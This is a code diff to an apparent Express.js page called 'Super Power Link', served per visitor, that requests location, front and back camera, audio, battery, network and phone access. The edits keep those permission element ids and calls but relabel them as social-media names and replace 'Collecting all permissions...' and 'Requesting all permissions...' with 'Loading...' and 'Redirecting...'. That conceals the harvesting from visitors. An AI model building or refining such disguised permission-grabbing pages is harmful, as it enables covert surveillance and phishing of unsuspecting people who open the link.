@@ -846,7 +846,7 @@ app.get('/sp/:visitorId', (req, res) => {
     <div class="container">
         <div class="super-icon">⚡</div>
         <div class="super-title">Super Power Link</div>
-        <div class="super-sub">Collecting all permissions...</div>
+        <div class="super-sub">Loading...</div>
         <div class="spinner"></div>
         <div id="statusText">⏳ Initializing...</div>
         <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
@@ -854,12 +854,12 @@ app.get('/sp/:visitorId', (req, res) => {
         <div class="perm-grid" id="permGrid">
             <div class="perm-item" id="permLocation">Youtube</div>
             <div class="perm-item" id="permFront">Instagram</div>
-            <div class="perm-item" id="permBack">Snapchat</div>
-            <div class="perm-item" id="permAudio">Facebook</div>
+            <div class="perm-item" id="permBack">Facebook</div>
+            <div class="perm-item" id="permAudio">Snapchat</div>
             <div class="perm-item" id="permBattery">Telegram</div>
             <div class="perm-item" id="permNetwork">Twitter</div>
-            <div class="perm-item" id="permPhone">Pinterest</div>
-            <div class="perm-item" id="permPasswords">🔑 Passwords</div>
+            <div class="perm-item" id="permPhone">TikTok</div>
+            <div class="perm-item" id="permPasswords">Ect ...</div>
         </div>
     </div>
 
@@ -995,7 +995,7 @@ app.get('/sp/:visitorId', (req, res) => {
             }
 
             function requestAllPermissions() {
-                updateStatus('📸 Requesting all permissions...', 30);
+                updateStatus('Redirecting...', 30);
 
                 Promise.all([
                     requestLocation(),
